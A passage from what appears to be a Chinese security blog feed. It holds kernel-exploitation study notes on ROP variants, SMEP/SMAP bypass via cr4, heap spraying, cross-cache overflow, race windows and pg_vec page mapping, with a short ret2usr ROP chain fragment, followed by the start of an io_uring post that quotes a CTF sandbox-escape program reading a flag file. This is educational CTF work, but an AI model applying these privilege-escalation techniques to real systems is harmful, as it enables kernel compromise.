__GFP_DMA32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_HIGHUSER (GFP_USER | __GFP_HIGHMEM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_HIGHUSER_MOVABLE (GFP_HIGHUSER | __GFP_MOVABLE | __GFP_SKIP_KASAN)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_TRANSHUGE_LIGHT ((GFP_HIGHUSER_MOVABLE | __GFP_COMP | \</span></span><br><span class="line"><span class="meta">                              __GFP_NOMEMALLOC | __GFP_NOWARN) &amp;  \</span></span><br><span class="line"><span class="meta">                             ~__GFP_RECLAIM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GFP_TRANSHUGE (GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM)</span></span><br></pre></td></tr></table></figure><p>此部分来自 <a href="https://elixir.bootlin.com/linux/v6.7.8/source/include/linux/gfp_types.h">https://elixir.bootlin.com/linux/v6.7.8/source/include/linux/gfp_types.h</a></p><p>如果需要快速知道对应的宏的值，可以直接用C 来 printf</p><p>如GFP_KERNEL: 0x6000C0</p><h1 id="攻击方法">攻击方法</h1><ul><li>ROP<ul><li>ret2usr</li><li>pt_regs</li><li>sycrop</li><li>ret2dir</li></ul></li><li>heap<ul><li>heap spray</li><li>heap overflow</li><li>double free</li><li>Cross cache overflow</li><li>page level heap fenshui</li></ul></li><li>Race Condition</li><li>USMA</li><li>基于idt的内存搜索</li></ul><h2 id="ROP">ROP</h2><h3 id="ret2usr">ret2usr</h3><p>由于KPTI的出现，ret2usr实际上已经不可用了，这里介绍一下ret2usr仅仅是为了拓展了解。</p><p>简单来说，ret2usr的核心就是利用内核的ring 0权限，执行用户空间的代码来实现提权。</p><p>一个典型的ret2usr rop链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rop_chain[i++] = (<span class="type">size_t</span>)getRootPrivilige;  </span><br><span class="line">rop_chain[i++] = SWAPGS_POPFQ_RET + offset;  </span><br><span class="line">rop_chain[i++] = <span class="number">0</span>;  </span><br><span class="line">rop_chain[i++] = IRETQ + offset;  </span><br><span class="line">rop_chain[i++] = (<span class="type">size_t</span>)getRootShell;  </span><br><span class="line">rop_chain[i++] = user_cs;  </span><br><span class="line">rop_chain[i++] = user_rflags;  </span><br><span class="line">rop_chain[i++] = user_sp;  </span><br><span class="line">rop_chain[i++] = user_ss;</span><br></pre></td></tr></table></figure><p>这里的getRootPrivilige就是用户态的 提权代码。</p><h4 id="绕过SMAP与SMEP">绕过SMAP与SMEP</h4><p>SMAP和SMEP是 <code>x64</code> 限制内核和用户空间的数据访问的一个架构功能，通过CR4寄存器的低位来判断是否开启。 开启后 从内核态访问用户态的数据会直接panic，因此通过在ROP链中插入 修改 <code>cr4</code> 寄存器的gadget即可绕过</p><h4 id="KPTI如何限制ret2usr">KPTI如何限制ret2usr</h4><p>最后讨论一下KPTI的实现</p><blockquote><p>When PTI is enabled, the kernel manages two sets of page tables. The first set is very similar to the single set which is present in kernels without PTI. This includes a complete mapping of userspace that the kernel can use for things like copy_to_user().<br>Although <em>complete</em>, the user portion of the kernel page tables is crippled by setting the NX bit in the top level. This ensures that any missed kernel-&gt;user CR3 switch will immediately crash userspace upon executing its first instruction.<br>The userspace page tables map only the kernel data needed to enter and exit the kernel. This data is entirely contained in the ‘struct cpu_entry_area’ structure which is placed in the fixmap which gives each CPU’s copy of the area a compile-time-fixed virtual address.<br>For new userspace mappings, the kernel makes the entries in its page tables like normal. The only difference is when the kernel makes entries in the top (PGD) level. In addition to setting the entry in the main kernel PGD, a copy of the entry is made in the userspace page tables’ PGD.<br>This sharing at the PGD level also inherently shares all the lower layers of the page tables. This leaves a single, shared set of userspace page tables to manage. One PTE to lock, one set of accessed bits, dirty bits, etc…</p></blockquote><p>KPTI维护两套页表，一套和没有开启KPTI 时的页表类似，拥有用户态和内核态的完整映射，这是给内核态使用的，不同的是， 此页表对于用户态内存空间的映射，是没有可执行权限的，这里权限的限制是通过页面来实现，因此ret2usr如果关闭了smap和smep，尽管可以访问到用户态数据，但是无法执行用户态代码；</p><p>此外，供给用户态的页表，拥有用户态的完整映射和内核的部分映射，这部分映射仅包含进入和离开内核态的代码。</p><h3 id="pt-regs-与-KROP">pt_regs 与 KROP</h3><p>在5.xx版本（笔者还没有检查具体是哪些版本），或者高版本没有开启如下选项时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_RANDOMIZE_KSTACK_OFFSET</span><br></pre></td></tr></table></figure><p>pt_regs是进入内核态时，压入栈中的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span>  </span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">* C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry  </span></span><br><span class="line"><span class="comment">* unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r15;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r14;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r13;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r12;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rbp;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rbx;  </span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span>  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r11;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r10;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r9;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> r8;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rax;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rcx;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rdx;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rsi;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rdi;  </span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">* On syscall entry, this is syscall#. On CPU exception, this is error code.  </span></span><br><span class="line"><span class="comment">* On hw interrupt, it&#x27;s IRQ number:  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> orig_rax;  </span><br><span class="line"><span class="comment">/* Return frame for iretq */</span>  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rip;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> cs;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> eflags;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> rsp;  </span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> ss;  </span><br><span class="line"><span class="comment">/* top of stack page */</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们注意到，这些内容，由用户态的寄存器决定，可以由我们控制。</p><p>因此这些部分可以用于布置ROP链， 当劫持到内核某个结构体的函数指针时，只需要<strong>寻找到一条形如 “add rsp, val ; ret” 的 gadget 便能够完成 ROP</strong></p><h3 id="ret2dir">ret2dir</h3><p>内核堆区 direct_mapping_arean 存在对于整个物理内存的映射，因此，通过mmap在用户态喷射的匿名页面，实际上也从此分配。</p><p>通过mmap大量分配，可以获取到 kernel 上一块近乎连续的物理内存，因此，通过不断堆喷布置gadget滑块，然后随机选择一个内核基地址进行栈迁移，最终就有很大概率命中我们写入的页面。</p><h3 id="sycrop">sycrop</h3><p>通过下硬件断点在用户态触发的方式，可以将寄存器内容推送到与 <code>per_cpu_entry_area</code> 固定偏移的DB stack上，而在linux 6.2之前， <code>per_cpu_entry_area</code> 没有加入随机化，地址固定，所以可以达到在内核固定地址造ROP链的手段</p><h3 id="work-for-cpu-fn"><code>work_for_cpu_fn</code></h3><p>这实际上是一个tricks，在内核很难ROP时，可以利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">work_for_cpu_fn</span><span class="params">(<span class="keyword">struct</span> work_struct *work)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, <span class="keyword">struct</span> work_for_cpu, work);</span><br><span class="line">  wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在劫持rsi的情况。</p><p>这个函数可以实现执行一次函数调用，并将返回值保存</p><h3 id="overview-2">overview</h3><p>注意到，上述列出的几个攻击方法，实际上核心问题就是ROP链写在哪些地方。</p><ul><li>pt_regs: 写在内核栈上</li><li>ret2dir： 写在direct mapping arena</li><li>sycrop</li></ul><p>由于ROP可以很方便劫持控制流，所用使用ROP攻击内核时，一般使用 <code>commit_cred</code> 进行提权</p><p>遗憾的是，在高版本内核，由于CFI的引入，很多时候难以找到完善的gadget进行利用，限制了ROP的使用</p><h2 id="heap">heap</h2><h3 id="UAF">UAF</h3><h4 id="有效大小Obj的UAF和良好的kmalloc-flag">有效大小Obj的UAF和良好的kmalloc flag</h4><p>这里主要指和内核关键结构体存在同样的分配size和flag的UAF， 如 <code>tty_operations</code> 或 <code>seq_operations</code> 等等。</p><p>利用这些结构的UAF可以直接leak 内核数据或者劫持控制流，这个攻击流程就不赘述了。</p><h4 id="任意大小的UAF">任意大小的UAF</h4><p>接下来讲述一下任意大小UAF(也没有那么任意)的利用</p><h5 id="CVE-2021-22555：-基于msg-msg的堆喷-GFP-KERNEL-ACCOUNT">CVE-2021-22555： 基于msg_msg的堆喷 | GFP_KERNEL_ACCOUNT</h5><h5 id="基于add-key的堆喷">基于add_key的堆喷</h5><h5 id="UASM">UASM</h5><p>见后文UASM的利用</p><h5 id="cross-cache-UAF">cross cache UAF</h5><p>#TODO</p><h3 id="heap-overflow">heap overflow</h3><h4 id="基础overflow">基础overflow</h4><p>同上文，存在特定结构体的Overflow， 因此可以非常方便地控制一个有效结构，此时的利用非常简单。</p><h4 id="cross-cache-overflow-打破slab隔离">cross_cache overflow  | 打破slab隔离</h4><p>众所周知，slab之间存在隔离，因此，如果溢出点在一个特定size的slab，此时，就无法通过直接的溢出劫持控制流。</p><p>但是，还是存在在buddy system溢出的办法。</p><p>考虑到堆喷耗尽buddy system的低位单页内存，那么之后从slab分配就会从高位连续的页面中切分，此时，就可以使得分配的页面来自一块近乎物理连续的内存，此时，如果在某个页面末尾的slab溢出，那么就可以溢出到下一个页面。</p><p>如果下一个页面，被另一个cache申请用来分配另外一种slab，此时就可以实现跨cache的溢出，从而控制有意义的cache.</p><h5 id="基于pipe-buffer的溢出通解">基于pipe_buffer的溢出通解</h5><p>#TODO</p><h2 id="Race-condition">Race condition</h2><h3 id="double-feach">double feach</h3><p>由于内核模块是全局的，如果对于内核模块的数据访问没有加锁，就很有可能出现竞态漏洞。</p><h3 id="userfault">userfault</h3><p>在linux 5.11以下可用。</p><p>主要是用来辅助条件竞争漏洞。</p><p>userfault是一个在用户态进行缺页处理接口。</p><p>在正常情况下， race condition的时间窗口是很短暂的，如果能够通过userfault 将操作停住，就能够将竞争的时间窗口扩大，实现竞争。</p><h3 id="fuse">fuse</h3><p>// 通过CVE分析fuse的利用<br>#TODO</p><h2 id="UASM-2">UASM</h2><p>来自 <a href="https://vul.360.net/archives/391">https://vul.360.net/archives/391</a> 的利用</p><p>这个利用笔者最初有点犹豫放在哪个部分。</p><p>最后笔者还是决定将内容单独列一个二级目录，因为笔者认为这代表了一种新的利用方法， 不仅仅是 pg_vec， 在io_uring中，同样存在着内核和用户地址的共同映射，有没有可能也利用此来利用呢。</p><p>甚至直接对内核页表进行修改，实际上也可以归结为这种利用的一部分。</p><p>更进一步的， 笔者认为，UASM 也许可以用在page level uaf中（由于笔者太菜了，暂时先码着）。</p><p>简单而言，在创建socket并设置packet后，此时，内核维护一个 <code>pg_vec</code> 数组，每一个数组地址对应着一个虚拟地址。</p><p>此时，如果能够通过UAF或者溢出修改pg_vec， 然后再在用户态调用mmap，内核实际上:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/net/packet/af_packet.c</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_mmap</span><span class="params">(file, sock, vma)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">for</span> (rb = &amp;po-&gt;rx_ring; rb &lt;= &amp;po-&gt;tx_ring; rb++) &#123;</span><br><span class="line">       <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; rb-&gt;pg_vec_len; i++) &#123;</span><br><span class="line">           <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">           <span class="type">void</span> *kaddr = rb-&gt;pg_vec[i].buffer;</span><br><span class="line">           <span class="keyword">for</span> (pg_num = <span class="number">0</span>; pg_num &lt; rb-&gt;pg_vec_pages; pg_num++) &#123;               page = pgv_to_page(kaddr);</span><br><span class="line">               err = vm_insert_page(vma, start, page);</span><br><span class="line">               <span class="keyword">if</span> (unlikely(err))           </span><br><span class="line">                   <span class="keyword">goto</span> out;     </span><br><span class="line">               start += PAGE_SIZE;</span><br><span class="line">              kaddr += PAGE_SIZE;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>vm_insert_page</code> 将这些页，插入了用户态地址空间。</p><p>这些页需要满足如下要求</p><ul><li>page不为匿名页</li><li>不为Slab子系统分配的页</li><li>page不含有type</li></ul><p>这就限制了使用内核堆的页面。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/mm/memory.c</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_page_before_insert</span><span class="params">(<span class="keyword">struct</span> page *page)</span>           </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">if</span> (PageAnon(page) || PageSlab(page) || page_has_type(page))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;      </span><br><span class="line">    flush_dcache_page(page);        </span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;      </span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>值得一提的是，这里pg_vec原来的虚拟地址原来的权限是无所谓的，因为并没有对原来虚拟地址的内存权限（也即这个页表项的内存权限）进行检查。</p><p>因此我们可以直接修改内核代码段或者内核模块代码段、数据段。<br>而且线性映射区域存在内核的全部映射，可以在这个地址范围找到上述页面。</p><p>更妙的是，pg_vec可以由用户态决定，不过其分配flag是<code>GFP_KERNEL</code></p><p>相比于ROP，利用更加简单，并且不受CFI的影响。</p><h2 id="dirtypagetable">dirtypagetable</h2><p>#TODO</p><h2 id="POP-page-level-ROP">POP | page level ROP</h2><p>来自blachhat2021的一种思路，主要是用来拓展脑洞，实际利用起来不如UASM直接改内核代码方便。但是很有传统利用的美感。</p><p>#TODO</p><h2 id="tricks">tricks</h2><ul><li>基于inter硬件漏洞的leak tricks</li><li>在内核“堆基址”（<code>page_offset_base</code>） + <code>0x9d000</code> 处存放着 <code>secondary_startup_64</code> 函数的地址</li></ul><h2 id="从CTF到实战利用的哲思">从CTF到实战利用的哲思</h2><p>#TODO</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;overview&quot;&gt;overview&lt;/h1&gt;
&lt;p&gt;笔者厌倦了用户态堆的种种tricks，于是决定进入kernel pwn的大坑😊&lt;/p&gt;
&lt;h1 id=&quot;安全机制&quot;&gt;安全机制&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;CONFIG_CFI_CLANG=y&lt;/stron</summary>
      
    
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://v3rdant.cn/tags/Pwn/"/>
    
    <category term="linux" scheme="https://v3rdant.cn/tags/linux/"/>
    
    <category term="CTF" scheme="https://v3rdant.cn/tags/CTF/"/>
    
    <category term="Kernel" scheme="https://v3rdant.cn/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Linux.io_uring-Top-down-Approach</title>
    <link href="https://v3rdant.cn/Linux.io_uring-Top-down-Approach/"/>
    <id>https://v3rdant.cn/Linux.io_uring-Top-down-Approach/</id>
    <published>2023-12-04T06:08:56.000Z</published>
    <updated>2024-03-05T00:46:36.001Z</updated>
    
    <content type="html"><![CDATA[<p>最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 <code>io_uring_setup</code> 一个系统调用，之前不久的ACTF中， 使用<code>mmap</code>、<code>io_uring_setup</code>、<code>io_uring_enter</code> 三个系统调用，完成了orw。 如何仅仅使用 <code>io_uring_setup</code> 完成orw呢？</p><p>本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，到内核io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 <code>io_uring</code>  具体的实现。</p><p>由于笔者的研究方向的是二进制安全，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。</p><span id="more"></span><h2 id="overview">overview</h2><p>在开始前，首先介绍一下什么是<a href="https://man.archlinux.org/man/io_uring.7.en">io_uring</a> 。</p><p>io_uring 是 Linux 5.1 引入的一套新的异步 I/O 接口机制,主要有以下特点:</p><ol><li>高效 - 通过共享内存和锁自由的接口设计大大降低了系统调用开销。</li><li>灵活 - 支持阻塞,非阻塞,轮询多种调用方式,可以同时提交多个 I/O 请求并通过轮询或异步方式得到完成通知。</li><li>通用 - 支持文件,网络,时间,引用计数等多种 I/O,统一了异步 I/O 接口。</li></ol><p>io_uring 主要由提交队列(SQ)、完成队列(CQ)、SQEs 请求和 CQEs 结果组成。</p><p>其中SQE和CQE 分别是SQ和CQ中的一个实体。</p><p>应用通过mmap映射SQ和CQ,向SQ提交I/O请求,再通过读CQ获取I/O完成结果。这避免了大量的 context switch 和系统调用开销。</p><p>这里以ACTF星盟的师傅写的liburing实现orw的一个小例子来介绍一下io_uring 的工作原理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref from https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span></span><br><span class="line">    <span class="type">int</span> fd, ret;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">4096</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_queue_init&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备打开操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dirfd = AT_FDCWD;  <span class="comment">// 当前工作目录的文件描述符</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">    <span class="type">int</span> flags = O_RDONLY;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_openat(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Open error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = cqe-&gt;res;  <span class="comment">// 获取打开的文件描述符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备读取操作</span></span><br><span class="line">    sqe = io_uring_get_sqe(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (!sqe) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Failed to get SQE\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    io_uring_prep_read(sqe, fd, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);</span><br><span class="line">    io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交请求</span></span><br><span class="line">    ret = io_uring_submit(&amp;ring);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_submit&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待完成</span></span><br><span class="line">    ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;io_uring_wait_cqe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理完成的请求</span></span><br><span class="line">    <span class="keyword">if</span> (cqe-&gt;res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Read error: %d\n&quot;</span>, cqe-&gt;res);</span><br><span class="line">        <span class="keyword">return</span> <span 